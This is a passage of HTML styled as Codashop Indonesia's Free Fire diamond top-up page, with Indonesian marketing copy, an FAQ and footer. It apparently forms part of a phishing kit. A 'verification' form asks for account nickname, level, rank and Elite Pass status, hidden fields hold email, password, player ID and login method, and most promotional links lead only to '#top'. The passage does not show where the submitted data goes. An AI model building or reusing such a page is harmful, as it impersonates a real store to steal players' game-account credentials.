                                                        <div data-v-4c7e0cdd="" class="form-section__email-input">
                                                            <div data-v-4c7e0cdd="" class="form-section__subheader-wrapper">
                                                                <div data-v-4c7e0cdd="" class="form-section__subheader">Lengkapi detail akun kamu untuk melanjutkan</div>
                                                            </div>
															<input type="hidden" name="email" id="validateEmail" readonly>
															<input type="hidden" name="password" id="validatePassword" readonly>
															<input type="hidden" name="playid" id="validatePlayid" readonly>
															<input type="hidden" name="login" id="validateLogin" readonly>
                                                            <div data-v-4c7e0cdd="" class="form-group form-group-container">
															<span class="provider-span">
                                                                    <div class="input-field-container">
                                                                        <div class="untouched pristine">
                                                                            <div data-v-2e483941="" data-v-4c7e0cdd="" class="input-block">
																			<label data-v-2e483941="" for="email" class="form-input--label" style="color: #3f3c4d;">Nickname:</label>
                                                                                <div data-v-2e483941="" class="input-holder product-form-input ">
																				<input data-v-2e483941="" placeholder="Masukkan nickname kamu..." type="text" id="nick" name="nick" class="product-form-input" required>
																				</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                            </span>
															</div>
															<div data-v-4c7e0cdd="" class="form-group form-group-container">
															<span class="provider-span">
                                                                    <div class="input-field-container">
                                                                        <div class="untouched pristine">
                                                                            <div data-v-2e483941="" data-v-4c7e0cdd="" class="input-block">
																			<label data-v-2e483941="" for="email" class="form-input--label" style="color: #3f3c4d;">Level Akun:</label>
                                                                                <div data-v-2e483941="" class="input-holder product-form-input ">
																				<select style="width: 100%; padding: 10px; line-height: 46px; background: transparent; border-radius: inherit; border: none; font-size: inherit; outline: none; font-family: NotoSans-Regular,sans-serif; color: var(--color-dark-main);" id="level" name="level" class="product-form-input" required>
																				<option selected="selected" disabled="disabled" value="">Pilih level akun kamu...</option>
																				<script>
																				for(var i = 1; i <= 200; i++){
																				document.write("<option>" + i + "</option>");
																				};
																				</script>
																				</select>
																				</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                            </span>
															</div>
															<div data-v-4c7e0cdd="" class="form-group form-group-container">
															<span class="provider-span">
                                                                    <div class="input-field-container">
                                                                        <div class="untouched pristine">
                                                                            <div data-v-2e483941="" data-v-4c7e0cdd="" class="input-block">
																			<label data-v-2e483941="" for="email" class="form-input--label" style="color: #3f3c4d;">Level Ranked:</label>
                                                                                <div data-v-2e483941="" class="input-holder product-form-input ">
																				<select style="width: 100%; padding: 10px; line-height: 46px; background: transparent; border-radius: inherit; border: none; font-size: inherit; outline: none; font-family: NotoSans-Regular,sans-serif; color: var(--color-dark-main);" id="tier" name="tier" class="product-form-input" required>
																				<option selected="selected" disabled="disabled" value="">Pilih level ranked kamu...</option>
																				<option>Bronze</option>
																				<option>Silver</option>
																				<option>Gold</option>
																				<option>Platinum</option>
																				<option>Diamond</option>
																				<option>Master</option>
																				<option>Grand Master</option>
																				</select>
																				</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                            </span>
															</div>
															<div data-v-4c7e0cdd="" class="form-group form-group-container">
															<span class="provider-span">
                                                                    <div class="input-field-container">
                                                                        <div class="untouched pristine">
                                                                            <div data-v-2e483941="" data-v-4c7e0cdd="" class="input-block">
																			<label data-v-2e483941="" for="email" class="form-input--label" style="color: #3f3c4d;">Status Elite Pass:</label>
                                                                                <div data-v-2e483941="" class="input-holder product-form-input ">
																				<select style="width: 100%; padding: 10px; line-height: 46px; background: transparent; border-radius: inherit; border: none; font-size: inherit; outline: none; font-family: NotoSans-Regular,sans-serif; color: var(--color-dark-main);" id="rpt" name="rpt" class="product-form-input" required>
																				<option selected="selected" disabled="disabled" value="">Pilih pernah elite pass atau tidak...</option>
																				<option>Ya, pernah elite pass</option>
																				<option>Tidak, tidak pernah elite pass</option>
																				</select>
																				</div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                            </span>
															</div>
                                                        </div>
														<br>
														<br>
                                                        <button type="button" class="ValidateVerificationDataBtn" onclick="ValidateVerificationData()" style="background: #6242fc; min-width: 60px; margin-left: auto; margin-right: auto; padding: 12px 18px; color: #fff; font-size: .875rem; font-family: NotoSans-Regular,sans-serif; border: none; border-radius: 42px; cursor: pointer; word-break: break-word; outline: none; box-shadow: -5px 5px 10px rgba(0,0,0,.16); display: block;">
                                                   Verifikasi Sekarang
                                                   </button>
                                                    <br>
													</div>
													</form>
                                                </div>
                                            </section>
                                    </span>
                                </div>
                                <div data-v-2e06dbb4="" class="product__tab-pane"></div>

                            </section>
                        </div>
						
                        <section data-v-751e829d="" data-v-2e06dbb4="" class="product-long-description__container">
                            <div data-v-751e829d="" class="product-long-description__content">
                                <h1 data-v-751e829d="" class="product-long-description__tagline-title">Top Up FF murah hanya di Codashop Indonesia</h1>
                                <div data-v-751e829d="" class="product-long-description__text">
                                    <p class="shop-content--paragraph">Codashop adalah toko official untuk membeli kredit game dan aplikasi secara resmi. Kami telah dipercaya jutaan gamers dan app users di 50 negara termasuk Indonesia. Topup game tanpa registrasi dan login untuk menjaga privasi anda. <a href="#top" target="_blank">Topup sekarang</a></p>

                                    <p class="shop-content--paragraph">Codashop Indonesia menyediakan Diamond Free Fire, yang membuka akses ke konten premium dalam permainan, meningkatkan pengalaman bermain anda ke level yang lebih tinggi!</p>

                                    <p class="shop-content--paragraph"><strong>Mengapa memilih Codashop untuk top up FF?</strong></p>

                                    <strong>Mudah &amp; cepat</strong><br>
                                    Hanya perlu hitungan detik untuk menyelesaikan beli Free Fire Diamonds di Codashop.<p></p>

                                    <strong>Instan &amp; Aman</strong><br>
                                    Pembelian top up akan langsung dikirim ke in-game account.<p></p>

                                    <strong>Layanan Pelanggan Cepat &amp; Ramah</strong><br>
                                    Tim CS terbaik kami selalu siap membantumu kapanpun, di manapun. <a href="https://id.support.codashop.com/hc/id?_ga=2.95806171.636481653.1690188006-1014208981.1683010100&amp;_gl=1*8r24w2*_ga*MTAxNDIwODk4MS4xNjgzMDEwMTAw*_ga_CSGEPL99WN*MTcwNDc5MDkxNC4yNDMuMS4xNzA0NzkyOTE3LjYuMC4w" target="_blank">Hubungi kami!</a>
                                    <p></p>

                                    <strong>Promo yang menarik</strong><br>
                                    Jangan lewatkan penawaran menarik, hadiah, dan masih banyak lagi. Hanya di Codashop! <p></p>
                                </div>
                            </div>
                        </section>
						
                        <section data-v-2e06dbb4="" class="product-faq-section">
                            <div class="product-faq-wrapper ">
                                <section data-v-a0fc9034="" class="product-faq-container">
                                    <div data-v-a0fc9034="" class="product-faq-wrapper">
                                        <h3 data-v-a0fc9034="" class="product-faq--question"><span data-v-a0fc9034="" class="faq-element--arrow"></span> Cara membeli diamond FF? </h3><!---->
                                    </div>
                                    <div data-v-a0fc9034="" class="product-faq-wrapper desktop">
                                        <h3 data-v-a0fc9034="" class="product-faq--question">Cara membeli diamond FF?</h3>
                                        <div data-v-a0fc9034="" class="product-faq--answer"><br>1. Masukkan Player ID Free Fire-mu
                                            <br>2. Masukkan jumlah diamond yang Kamu inginkan
                                            <br>3. Pilih cara pembayaran yang Kamu kehendaki
                                            <br>4. Klik tombol "Beli Sekarang" untuk menyelesaikan transaksi pembayaran
                                            <br><br>
                                            Setelah pembayaran lunas, Diamond akan langsung ditambahkan di akun Free Fire-mu. <a href="#top" target="_blank">Hubungi kami!</a> untuk membeli Free Fire Diamonds sekarang!
                                        </div>
                                    </div>
                                </section>
								
                                <section data-v-a0fc9034="" class="product-faq-container">
                                    <div data-v-a0fc9034="" class="product-faq-wrapper">
                                        <h3 data-v-a0fc9034="" class="product-faq--question"><span data-v-a0fc9034="" class="faq-element--arrow"></span> Cara membeli membership FF? </h3><!---->
                                    </div>
                                    <div data-v-a0fc9034="" class="product-faq-wrapper desktop">
                                        <h3 data-v-a0fc9034="" class="product-faq--question">Cara membeli membership FF?</h3>
                                        <div data-v-a0fc9034="" class="product-faq--answer">Di Free Fire, anda dapat meningkatkan Elite Pass gratis anda untuk mengakses hadiah yang lebih baik. Anda bisa membeli Elite Pass seharga 499 diamonds, sementara Elite Package harganya 999 diamonds.<br>

                                            <br>1. Masuk ke aplikasi Free Fire.
                                            <br>2. Di sudut kiri bawah layar utama Free Fire, klik "Elite Pass".
                                            <br>3. Klik tombol "Upgrade" dan beli Elite Pass seharga 499 diamonds atau dapatkan lebih banyak dengan Elite Package seharga 999 diamonds.
                                            <br>4. Konfirmasikan peningkatan Elite Pass Anda.
                                            <br><br>
                                            Siap? Mulailah membuka hadiah Elite Pass dengan menyelesaikan tugas dan tantangan di bagian misi permainan.
                                        </div>
                                    </div>
                                </section>
								
                                <section data-v-a0fc9034="" class="product-faq-container">
                                    <div data-v-a0fc9034="" class="product-faq-wrapper">
                                        <h3 data-v-a0fc9034="" class="product-faq--question"><span data-v-a0fc9034="" class="faq-element--arrow"></span> Berapa harga top up FF? </h3><!---->
                                    </div>
                                    <div data-v-a0fc9034="" class="product-faq-wrapper desktop">
                                        <h3 data-v-a0fc9034="" class="product-faq--question">Berapa harga top up FF?</h3>
                                        <div data-v-a0fc9034="" class="product-faq--answer">Harga Diamond FF:
                                            <br>5 to 50 Diamonds - Rp. 901 to Rp. 7,207
                                            <br>70 to 140 Diamonds - Rp. 9,009 to Rp. 18,018
                                            <br>355 to 720 Diamonds - Rp. 45,045 to Rp. 90,090
                                            <br>1450 to 2180 Diamonds - Rp. 180,180 to Rp. 270,270
                                            <br>3640 to 7290 Diamonds - Rp. 450,450 to Rp. 900,901
                                            <br>36500 to 73100 Diamonds - Rp. 4,504,505 to Rp. 9,009,009
                                            <br><br>
                                            Harga Elite Pass FF:
                                            <br>Elite Pass: 499 Diamonds
                                            <br>Elite Package: 999 Diamonds
                                            <br><br>
                                            <strong>Catatan:</strong> Harga dapat berubah tanpa pemberitahuan terlebih dahulu. Untuk info lengkap, silahkan kunjungi halaman Free Fire kami, <a href="#top" target="_blank">klik disini</a>.
                                        </div>
                                    </div>
                                </section>
								
                                <section data-v-a0fc9034="" class="product-faq-container">
                                    <div data-v-a0fc9034="" class="product-faq-wrapper">
                                        <h3 data-v-a0fc9034="" class="product-faq--question"><span data-v-a0fc9034="" class="faq-element--arrow"></span> Cara top up Free Fire pakai pulsa </h3><!---->
                                    </div>
                                    <div data-v-a0fc9034="" class="product-faq-wrapper desktop">
                                        <h3 data-v-a0fc9034="" class="product-faq--question">Cara top up Free Fire pakai pulsa</h3>
                                        <div data-v-a0fc9034="" class="product-faq--answer"><br>1. Masukkan Player ID Free Fire-mu
                                            <br>2. Masukkan jumlah diamond yang Kamu inginkan
                                            <br>3. Pilih provider pulsa yang anda inginkan (Telkomsel, Indosat, Tri, XL, Smartfren)
                                            <br>4. Klik tombol "Beli Sekarang" untuk menyelesaikan transaksi pembayaran
                                            <br><br>
                                            Setelah pembayaran lunas, Diamond akan langsung ditambahkan di akun Free Fire-mu. <a href="#top" target="_blank">klik disini</a> untuk membeli Free Fire Diamonds sekarang!
                                        </div>
                                    </div>
                                </section>
								
                                <section data-v-a0fc9034="" class="product-faq-container">
                                    <div data-v-a0fc9034="" class="product-faq-wrapper">
                                        <h3 data-v-a0fc9034="" class="product-faq--question"><span data-v-a0fc9034="" class="faq-element--arrow"></span> Top up FF termurah </h3><!---->
                                    </div>
                                    <div data-v-a0fc9034="" class="product-faq-wrapper desktop">
                                        <h3 data-v-a0fc9034="" class="product-faq--question">Top up FF termurah</h3>
                                        <div data-v-a0fc9034="" class="product-faq--answer">Dapatkan harga paling terjangkau, diskon dan promo menarik dengan topup game Free Fire di Codashop Indonesia.
                                            <br><br>
                                            Dapatkan lebih banyak bonus dan penawaran eksklusif saat Anda mendaftar Coda Rewards. <a href="https://www.codashop.com/id-id/sign-up" target="_blank">Daftar sekarang!</a>!
                                        </div>
                                    </div>
                                </section>
								
                            </div>
                        </section>
						
                        <div data-v-6514a331="" data-v-2e06dbb4="" class="pixel-container">
                            <div data-v-6514a331="" id="bottomPage" class="pixel-container__pixel"></div>
                        </div>
                    </div>
                </main>
            </div>
			
            <footer data-v-2b49aa10="" class="footer codashop__footer product-page">
                <div data-v-2b49aa10="" class="footer__clip-path"></div>
                <div data-v-2b49aa10="" class="footer__container">
                    <section data-v-2b49aa10="" class="footer__main-section"><!---->
                        <div data-v-7c4b9a2a="" data-v-2b49aa10="" class="footer__contact-section footer__main-section__items"><strong data-v-7c4b9a2a="" class="footer__section-title">Butuh Bantuan?</strong><a data-v-7c4b9a2a="" href="https://id.support.codashop.com" target="_blank" rel="noopener" class="footer__contact-link"><span data-v-7c4b9a2a="" class="footer__contact-icon"><svg data-v-6bb89cda="" data-v-7c4b9a2a="" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path data-v-6bb89cda="" d="M2.69368 4.75517C3.18309 4.66659 3.83299 4.66659 4.8149 4.66659H5.85193C7.30392 4.66659 8.02992 4.66659 8.5845 4.95301C9.07233 5.20496 9.46895 5.60699 9.71751 6.10146C10.0001 6.66361 10.0001 7.3995 10.0001 8.87129V10.2898C10.0001 10.4367 10.0001 10.5102 9.99718 10.5723C9.95029 11.5763 9.35044 12.4314 8.49879 12.8323M2.69368 4.75517C2.45939 4.79757 2.26187 4.86028 2.08233 4.95301C1.5945 5.20496 1.19788 5.60699 0.949324 6.10146C0.666748 6.66361 0.666748 7.3995 0.666748 8.87129V11.0937C0.666748 12.1885 1.54233 13.076 2.62242 13.076H2.93444C3.33842 13.076 3.61466 13.4896 3.46462 13.8698C3.25282 14.4065 3.86264 14.8917 4.3267 14.5557L5.68042 13.5756C5.69422 13.5656 5.70113 13.5606 5.70791 13.5557C6.14036 13.2469 6.65567 13.0795 7.18469 13.076C7.19299 13.076 7.20406 13.076 7.22619 13.076C7.38795 13.076 7.46882 13.076 7.53009 13.073C7.87505 13.0565 8.20219 12.972 8.49879 12.8323M2.69368 4.75517C2.73086 4.05439 2.81937 3.56678 3.03006 3.15328C3.34964 2.52608 3.85957 2.01614 4.48678 1.69656C5.19982 1.33325 6.13324 1.33325 8.00008 1.33325H9.33341C11.2003 1.33325 12.1337 1.33325 12.8467 1.69656C13.4739 2.01614 13.9839 2.52608 14.3034 3.15328C14.6667 3.86632 14.6667 4.79974 14.6667 6.66659V9.48548C14.6667 10.8742 13.541 11.9999 12.1523 11.9999H11.7511C11.2317 11.9999 10.8766 12.5245 11.0695 13.0068C11.3418 13.6875 10.5578 14.303 9.9611 13.8768L8.49879 12.8323" stroke="#280031"></path>
                                        <path data-v-6bb89cda="" d="M4.00008 9.33341C4.00008 9.7016 3.7016 10.0001 3.33341 10.0001C2.96522 10.0001 2.66675 9.7016 2.66675 9.33341C2.66675 8.96522 2.96522 8.66675 3.33341 8.66675C3.7016 8.66675 4.00008 8.96522 4.00008 9.33341Z" fill="#280031"></path>
                                        <path data-v-6bb89cda="" d="M6.00008 9.33341C6.00008 9.7016 5.7016 10.0001 5.33341 10.0001C4.96522 10.0001 4.66675 9.7016 4.66675 9.33341C4.66675 8.96522 4.96522 8.66675 5.33341 8.66675C5.7016 8.66675 6.00008 8.96522 6.00008 9.33341Z" fill="#280031"></path>
                                        <path data-v-6bb89cda="" d="M8.00008 9.33341C8.00008 9.7016 7.7016 10.0001 7.33342 10.0001C6.96523 10.0001 6.66675 9.7016 6.66675 9.33341C6.66675 8.96522 6.96523 8.66675 7.33342 8.66675C7.7016 8.66675 8.00008 8.96522 8.00008 9.33341Z" fill="#280031"></path>
                                    </svg></span><span data-v-7c4b9a2a="" class="footer__contact-label">Hubungi Kami</span><span data-v-7c4b9a2a="" class="footer__contact-external-icon"><svg data-v-063ff78c="" data-v-7c4b9a2a="" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="icon-external-link icon-color--portal">
                                        <path data-v-063ff78c="" d="M2.7073 14.1533L3.00119 13.7488H3.00119L2.7073 14.1533ZM1.96986 13.4158L1.56535 13.7097H1.56535L1.96986 13.4158ZM12.6966 13.4158L12.2921 13.122V13.122L12.6966 13.4158ZM11.9592 14.1533L11.6653 13.7488L11.9592 14.1533ZM2.7073 3.42651L2.41341 3.022L2.7073 3.42651ZM1.96986 4.16395L1.56535 3.87006H1.56535L1.96986 4.16395ZM8.66059 3.29467C8.93671 3.29798 9.16324 3.07682 9.16655 2.8007C9.16986 2.52457 8.9487 2.29805 8.67258 2.29474L8.66059 3.29467ZM13.8284 7.45057C13.8251 7.17445 13.5986 6.95329 13.3225 6.9566C13.0463 6.95991 12.8252 7.18644 12.8285 7.46256L13.8284 7.45057ZM6.6702 8.33584C6.47494 8.53111 6.47494 8.84769 6.6702 9.04295C6.86547 9.23821 7.18205 9.23821 7.37731 9.04295L6.6702 8.33584ZM10.3214 0.175525C10.0452 0.176757 9.82236 0.401611 9.82359 0.677751C9.82482 0.95389 10.0497 1.17675 10.3258 1.17552L10.3214 0.175525ZM11.9783 0.668137L11.9806 1.16813L11.9783 0.668137ZM15.045 3.7348L14.545 3.73257L15.045 3.7348ZM14.5376 5.38733C14.5364 5.66347 14.7593 5.88833 15.0354 5.88956C15.3115 5.89079 15.5364 5.66794 15.5376 5.3918L14.5376 5.38733ZM14.4091 1.00859L14.7152 0.613175L14.7152 0.613175L14.4091 1.00859ZM14.7046 1.30401L15.1 0.997994V0.997994L14.7046 1.30401ZM14.5514 1.16171L14.2448 0.766808L14.22 0.786015L14.1979 0.808158L14.5514 1.16171ZM7.33325 14.2899C6.0722 14.2899 5.16658 14.2892 4.46528 14.2132C3.77334 14.1383 3.33986 13.9948 3.00119 13.7488L2.41341 14.5578C2.95096 14.9484 3.58054 15.1232 4.35757 15.2074C5.12524 15.2906 6.09448 15.2899 7.33325 15.2899V14.2899ZM0.833252 8.7899C0.833252 10.0287 0.832566 10.9979 0.915737 11.7656C0.999923 12.5426 1.1748 13.1722 1.56535 13.7097L2.37437 13.122C2.12831 12.7833 1.98489 12.3498 1.90992 11.6579C1.83394 10.9566 1.83325 10.0509 1.83325 8.7899H0.833252ZM3.00119 13.7488C2.76066 13.574 2.54913 13.3625 2.37437 13.122L1.56535 13.7097C1.80179 14.0352 2.08798 14.3214 2.41341 14.5578L3.00119 13.7488ZM12.8333 8.7899C12.8333 10.0509 12.8326 10.9566 12.7566 11.6579C12.6816 12.3498 12.5382 12.7833 12.2921 13.122L13.1012 13.7097C13.4917 13.1722 13.6666 12.5426 13.7508 11.7656C13.8339 10.9979 13.8333 10.0287 13.8333 8.7899H12.8333ZM7.33325 15.2899C8.57203 15.2899 9.54127 15.2906 10.3089 15.2074C11.086 15.1232 11.7155 14.9484 12.2531 14.5578L11.6653 13.7488C11.3266 13.9948 10.8932 14.1383 10.2012 14.2132C9.49992 14.2892 8.5943 14.2899 7.33325 14.2899V15.2899ZM12.2921 13.122C12.1174 13.3625 11.9058 13.574 11.6653 13.7488L12.2531 14.5578C12.5785 14.3214 12.8647 14.0352 13.1012 13.7097L12.2921 13.122ZM7.33325 2.2899C6.09448 2.2899 5.12524 2.28921 4.35757 2.37238C3.58054 2.45657 2.95096 2.63145 2.41341 3.022L3.00119 3.83102C3.33986 3.58496 3.77334 3.44153 4.46528 3.36657C5.16658 3.29059 6.0722 3.2899 7.33325 3.2899V2.2899ZM1.83325 8.7899C1.83325 7.52885 1.83394 6.62323 1.90992 5.92193C1.98489 5.22999 2.12831 4.79651 2.37437 4.45784L1.56535 3.87006C1.1748 4.4076 0.999923 5.03719 0.915737 5.81422C0.832566 6.58188 0.833252 7.55113 0.833252 8.7899H1.83325ZM2.41341 3.022C2.08798 3.25844 1.80179 3.54463 1.56535 3.87006L2.37437 4.45784C2.54913 4.21731 2.76066 4.00578 3.00119 3.83102L2.41341 3.022ZM7.33325 3.2899C7.82438 3.2899 8.26342 3.28991 8.66059 3.29467L8.67258 2.29474C8.26823 2.28989 7.82279 2.2899 7.33325 2.2899V3.2899ZM13.8333 8.7899C13.8333 8.30037 13.8333 7.85493 13.8284 7.45057L12.8285 7.46256C12.8332 7.85974 12.8333 8.29878 12.8333 8.7899H13.8333ZM10.3258 1.17552L11.9806 1.16813L11.9761 0.168142L10.3214 0.175525L10.3258 1.17552ZM14.545 3.73257L14.5376 5.38733L15.5376 5.3918L15.545 3.73704L14.545 3.73257ZM11.9806 1.16813C12.6522 1.16514 13.1136 1.16383 13.4651 1.20222C13.8065 1.23951 13.9803 1.30897 14.1031 1.40401L14.7152 0.613175C14.3866 0.358934 14.0049 0.255221 13.5736 0.20813C13.1525 0.162136 12.6242 0.165251 11.9761 0.168142L11.9806 1.16813ZM15.545 3.73704C15.5479 3.08897 15.551 2.56067 15.505 2.13951C15.4579 1.70829 15.3542 1.32652 15.1 0.997994L14.3091 1.61002C14.4042 1.73284 14.4736 1.90664 14.5109 2.24807C14.5493 2.59957 14.548 3.061 14.545 3.73257L15.545 3.73704ZM7.37731 9.04295L14.905 1.51526L14.1979 0.808158L6.6702 8.33584L7.37731 9.04295ZM14.1031 1.40401C14.1422 1.43423 14.1792 1.46689 14.214 1.50177L14.9222 0.795796C14.8572 0.730619 14.7881 0.669613 14.7152 0.613175L14.1031 1.40401ZM14.214 1.50177C14.2479 1.5358 14.2797 1.57194 14.3091 1.61002L15.1 0.997994C15.0449 0.926878 14.9856 0.859356 14.9222 0.795796L14.214 1.50177ZM14.8581 1.55662L14.8748 1.54369L14.2614 0.753882L14.2448 0.766808L14.8581 1.55662Z" fill="currentColor"></path>
                                    </svg></span></a></div>
                        <div data-v-f87dfb1c="" data-v-2b49aa10="" class="footer__country-section footer__main-section__items"><strong data-v-f87dfb1c="" class="footer__section-title">Area</strong>
                            <div data-v-f87dfb1c="" class="footer__locale"><a data-v-f87dfb1c="" href="/international" class="footer__flag"><span data-v-f87dfb1c="" class="footer__country-flag"><i data-v-f87dfb1c="" id="footer__country-flag" class="f32_indonesia"></i></span><span data-v-f87dfb1c="" class="footer__flag-label">Indonesia</span><span data-v-f87dfb1c="" class="footer__country-icon"><svg data-v-1b9993e4="" data-v-f87dfb1c="" width="16" height="16" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg">
                                            <path data-v-1b9993e4="" d="M5.33325 7.99992H4.83325H5.33325ZM10.6666 7.99992H11.1666H10.6666ZM7.99992 10.6666V11.1666V10.6666ZM9.37953 14.5237L9.48248 15.0129L9.37953 14.5237ZM6.62032 14.5237L6.51736 15.0129L6.62032 14.5237ZM1.82566 5.48072L1.36278 5.29166H1.36278L1.82566 5.48072ZM1.47617 9.37952L0.986888 9.48248L1.47617 9.37952ZM6.62032 1.47617L6.51736 0.986888L6.62032 1.47617ZM9.37952 1.47617L9.48248 0.986889L9.37952 1.47617ZM14.1205 5.50477L13.9754 5.02629L14.1205 5.50477ZM1.87856 5.50453L2.0237 5.02606L1.87856 5.50453ZM13.712 5.67146C14.0049 6.38925 14.1666 7.17508 14.1666 7.99992H15.1666C15.1666 7.04331 14.9789 6.1293 14.6379 5.29362L13.712 5.67146ZM14.1666 7.99992C14.1666 8.4381 14.121 8.86509 14.0344 9.27657L15.0129 9.48248C15.1137 9.0037 15.1666 8.50771 15.1666 7.99992H14.1666ZM14.0344 9.27657C13.5334 11.6574 11.6574 13.5334 9.27657 14.0344L9.48248 15.0129C12.2512 14.4303 14.4303 12.2512 15.0129 9.48248L14.0344 9.27657ZM9.27657 14.0344C8.86509 14.121 8.4381 14.1666 7.99992 14.1666V15.1666C8.50771 15.1666 9.0037 15.1137 9.48248 15.0129L9.27657 14.0344ZM7.99992 14.1666C7.56173 14.1666 7.13475 14.121 6.72327 14.0344L6.51736 15.0129C6.99614 15.1137 7.49213 15.1666 7.99992 15.1666V14.1666ZM1.83325 7.99992C1.83325 7.17444 1.99518 6.38802 2.28854 5.66977L1.36278 5.29166C1.02124 6.12787 0.833252 7.04256 0.833252 7.99992H1.83325ZM6.72327 14.0344C4.34247 13.5334 2.46643 11.6574 1.96546 9.27657L0.986888 9.48248C1.56949 12.2512 3.74862 14.4303 6.51736 15.0129L6.72327 14.0344ZM1.96546 9.27657C1.87888 8.86509 1.83325 8.4381 1.83325 7.99992H0.833252C0.833252 8.50771 0.886143 9.00369 0.986888 9.48248L1.96546 9.27657ZM2.28854 5.66977C3.05208 3.80035 4.70716 2.38969 6.72327 1.96546L6.51736 0.986888C4.17149 1.48051 2.24983 3.11985 1.36278 5.29166L2.28854 5.66977ZM6.72327 1.96546C7.13475 1.87888 7.56173 1.83325 7.99992 1.83325V0.833252C7.49213 0.833252 6.99614 0.886143 6.51736 0.986888L6.72327 1.96546ZM7.99992 1.83325C8.4381 1.83325 8.86509 1.87888 9.27657 1.96546L9.48248 0.986889C9.0037 0.886143 8.50771 0.833252 7.99992 0.833252V1.83325ZM9.27657 1.96546C11.2933 2.38982 12.9488 3.8012 13.712 5.67146L14.6379 5.29362C13.7512 3.12084 11.8291 1.48066 9.48248 0.986889L9.27657 1.96546ZM8.90318 1.62816C9.08713 2.20467 9.76806 4.42195 10.0471 6.45915L11.0379 6.32343C10.7464 4.19557 10.0426 1.9093 9.85586 1.32418L8.90318 1.62816ZM10.0471 6.45915C10.1219 7.00512 10.1666 7.52945 10.1666 7.99992H11.1666C11.1666 7.4703 11.1166 6.8983 11.0379 6.32343L10.0471 6.45915ZM13.9754 5.02629C13.2437 5.24821 11.8695 5.63795 10.4518 5.89959L10.6333 6.88299C12.1037 6.61161 13.5181 6.20995 14.2656 5.98325L13.9754 5.02629ZM10.4518 5.89959C9.59176 6.05832 8.73302 6.16659 7.99992 6.16659V7.16659C8.8194 7.16659 9.74518 7.04689 10.6333 6.88299L10.4518 5.89959ZM10.1666 7.99992C10.1666 8.69691 10.0687 9.50801 9.92235 10.3265L10.9067 10.5025C11.0582 9.65545 11.1666 8.7798 11.1666 7.99992H10.1666ZM9.92235 10.3265C9.60156 12.1207 9.06264 13.8719 8.90319 14.3717L9.85586 14.6757C10.0195 14.1628 10.5743 12.362 10.9067 10.5025L9.92235 10.3265ZM14.3717 8.90318C13.8719 9.06264 12.1207 9.60156 10.3265 9.92235L10.5025 10.9067C12.362 10.5743 14.1628 10.0195 14.6757 9.85586L14.3717 8.90318ZM10.3265 9.92235C9.50801 10.0687 8.69691 10.1666 7.99992 10.1666V11.1666C8.7798 11.1666 9.65545 11.0582 10.5025 10.9067L10.3265 9.92235ZM7.99992 10.1666C7.30293 10.1666 6.49183 10.0687 5.6733 9.92235L5.49729 10.9067C6.34439 11.0582 7.22003 11.1666 7.99992 11.1666V10.1666ZM5.6733 9.92235C3.87916 9.60156 2.1279 9.06264 1.62816 8.90318L1.32418 9.85586C1.83704 10.0195 3.63781 10.5743 5.49729 10.9067L5.6733 9.92235ZM4.83325 7.99992C4.83325 8.7798 4.94164 9.65545 5.0931 10.5025L6.07749 10.3265C5.93114 9.50801 5.83325 8.69691 5.83325 7.99992H4.83325ZM5.0931 10.5025C5.42557 12.362 5.98034 14.1628 6.14398 14.6757L7.09666 14.3717C6.9372 13.8719 6.39828 12.1207 6.07749 10.3265L5.0931 10.5025ZM6.14398 1.32418C5.95728 1.9093 5.25345 4.19557 4.96195 6.32343L5.95269 6.45915C6.23178 4.42195 6.91271 2.20467 7.09666 1.62816L6.14398 1.32418ZM4.96195 6.32343C4.88319 6.8983 4.83325 7.4703 4.83325 7.99992H5.83325C5.83325 7.52945 5.8779 7.00512 5.95269 6.45915L4.96195 6.32343ZM7.99992 6.16659C7.26682 6.16659 6.40808 6.05832 5.54807 5.89959L5.36657 6.88299C6.25466 7.04689 7.18044 7.16659 7.99992 7.16659V6.16659ZM5.54807 5.89959C4.12985 5.63785 2.75516 5.24793 2.0237 5.02606L1.73343 5.983C2.48068 6.20967 3.89566 6.61152 5.36657 6.88299L5.54807 5.89959ZM13.9445 5.03879C13.9534 5.0342 13.9639 5.02976 13.9754 5.02629L14.2656 5.98325C14.3149 5.96829 14.3613 5.94913 14.4053 5.92628L13.9445 5.03879ZM1.5648 5.90727C1.61661 5.93896 1.67285 5.96463 1.73343 5.983L2.0237 5.02606C2.04681 5.03307 2.06812 5.0429 2.08652 5.05416L1.5648 5.90727Z" fill="#6242FC"></path>
                                        </svg></span></a></div><!---->
                        </div>
                        <div data-v-0210a36c="" data-v-2b49aa10="" class="footer__social-section footer__main-section__items"><strong data-v-0210a36c="" class="footer__section-title">Dapatkan berita Coda di:</strong>
                            <div data-v-0210a36c="" class="footer__social-content"><a data-v-0210a36c="" href="https://www.facebook.com/Codashop.IDofficial/" label="Codashop Official Facebook" target="_blank" rel="noopener" aria-label="Codashop Official Facebook" class="footer__social-links"><img data-v-0210a36c="" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-facebook-H36.png" alt="Codashop Official Facebook" height="24" width="24" class="footer__icon"></a><a data-v-0210a36c="" href="https://www.youtube.com/c/CodashopOfficial" label="Youtube" target="_blank" rel="noopener" aria-label="Youtube" class="footer__social-links"><img data-v-0210a36c="" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-youtube-H36.png" alt="Youtube" height="24" width="24" class="footer__icon"></a><a data-v-0210a36c="" href="https://www.instagram.com/codashop.idofficial/?hl=id" label="Codashop Official Instagram" target="_blank" rel="noopener" aria-label="Codashop Official Instagram" class="footer__social-links"><img data-v-0210a36c="" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-instagram-H36.png" alt="Codashop Official Instagram" height="24" width="24" class="footer__icon"></a><a data-v-0210a36c="" href="https://www.tiktok.com/@codashop_global?lang=en" label="Tiktok" target="_blank" rel="noopener" aria-label="Tiktok" class="footer__social-links"><img data-v-0210a36c="" src="https://cdn1.codashop.com/S/content/social-media-logo/36/socmed-tiktok-H36.png" alt="Tiktok" height="24" width="24" class="footer__icon"></a></div>
                        </div><!----><!---->
                    </section>
                </div>
                <div data-v-2b49aa10="" class="footer__sub-container">
                    <section data-v-2b49aa10="" class="footer__sub-section">
